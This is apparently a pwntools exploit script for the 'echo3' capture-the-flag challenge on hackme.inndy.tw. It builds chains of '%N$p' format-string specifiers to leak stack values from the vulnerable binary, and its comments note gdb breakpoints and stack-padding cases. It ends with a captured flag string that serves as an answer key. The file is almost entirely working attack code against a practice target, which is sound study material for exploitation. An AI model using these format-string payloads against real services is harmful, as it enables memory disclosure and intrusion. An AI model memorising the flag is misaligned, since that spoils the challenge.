#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
{32: 1024, 48: 1024, 64: 1024, 4128: 1024, 4144: 1024, 4160: 1024, 8224: 1024, 8240: 1024, 8256: 1024, 16: 512, 80: 512, 4112: 512, 4176: 512, 8208: 512, 8272: 512, 12320: 16, 12336: 16, 12352: 16, 12304: 8, 12368: 2}
20

栈上制造空间一共20种情况

b *0x08048737  read magic
b *0x08048774  分配栈空间
b read + 5
b *0x08048646  printf

n = (x // 4)

"""


import re, sys, os.path as path
from pwn import *
from pwnlib import gdb
from collections import OrderedDict

context(arch="i386", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "echo3")
_, host, port = re.split("\s+", "nc hackme.inndy.tw 7720")

elf = ELF(elf_name)
io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)

def print_payload():
    buf = "%1$p"
    i = 2
    while 1:
        x = "#%{}$p".format(i)
        if len(buf) + len(x) > 4094:
            break
        i += 1
        buf += x
    buf += "\n\0"
    return buf

def main():
    # stack_paddings = {32: 1024, 48: 1024, 64: 1024, 4128: 1024, 4144: 1024, 4160: 1024, 8224: 1024, 8240: 1024, 8256: 1024, 16: 512, 80: 512, 4112: 512, 4176: 512, 8208: 512, 8272: 512, 12320: 16, 12336: 16, 12352: 16, 12304: 8, 12368: 2}
    stack_paddings = {32: 1024, 48: 1024, 64: 1024}

    n_list = [k for k in stack_paddings.keys()]
    payload = "#".join(["%{}$p".format(n // 4 + 19) for n in n_list])

    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    main()

# CTF{081ecc7c8d658409eb43358dcc1cf446}